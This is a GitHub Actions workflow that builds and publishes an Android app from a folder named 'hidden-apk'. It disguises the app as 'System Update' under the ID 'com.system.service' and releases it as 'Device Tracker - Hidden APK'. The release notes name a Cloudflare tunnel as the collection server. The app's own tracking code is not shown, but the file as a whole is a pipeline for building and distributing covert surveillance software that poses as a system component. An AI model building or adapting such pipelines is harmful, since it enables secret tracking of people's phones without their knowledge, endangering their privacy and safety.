name: Build Hidden APK

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    
    steps:
    - name: Checkout code
      uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab  # v3.5.2
    
    - name: Setup Node.js
      uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d  # v3.8.1
      with:
        node-version: '18'
    
    - name: Install dependencies
      run: |
        npm install
        npm install -g @capacitor/cli @capacitor/core @capacitor/android
    
    - name: Create www directory
      run: mkdir -p www
    
    - name: Copy hidden-apk files
      run: |
        if [ -d "hidden-apk" ] && [ -f "hidden-apk/index.html" ]; then
          cp -r hidden-apk/* www/
          echo "✅ Files copied to www/"
          ls -la www/
        else
          echo "❌ hidden-apk/index.html not found!"
          exit 1
        fi
    
    - name: Create Capacitor config
      run: |
        cat > capacitor.config.json << 'EOF'
        {
          "appId": "com.system.service",
          "appName": "System Update",
          "webDir": "www",
          "plugins": {
            "SplashScreen": {
              "launchShowDuration": 0,
              "launchAutoHide": false
            }
          },
          "server": {
            "androidScheme": "https",
            "cleartext": true
          }
        }
        EOF
    
    - name: Add Android platform
      run: npx cap add android || echo "Platform already exists"
    
    - name: Sync Capacitor
      run: npx cap sync android
    
    - name: Build APK
      run: |
        cd android
        chmod +x gradlew
        ./gradlew assembleDebug
        echo "✅ APK built successfully"
        ls -la app/build/outputs/apk/debug/
    
    - name: Upload APK to Artifacts
      uses: actions/upload-artifact@5d5d22a31266ced268874388b861e4b58bb5c2f3  # v4.3.1
      with:
        name: hidden-app-apk
        path: android/app/build/outputs/apk/debug/app-debug.apk
        retention-days: 30
    
    - name: Create Release
      uses: softprops/action-gh-release@de2c0eb89ae2a093876385947365aca7b0e5f844  # v2.0.4
      with:
        files: android/app/build/outputs/apk/debug/app-debug.apk
        tag_name: v${{ github.run_number }}
        name: Hidden APK v${{ github.run_number }}
        body: |
          ## Device Tracker - Hidden APK
          
          **Build Info:**
          - Build #${{ github.run_number }}
          - Commit: ${{ github.sha }}
          
          **Server:** assign-place-picture-recommendation.trycloudflare.com
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
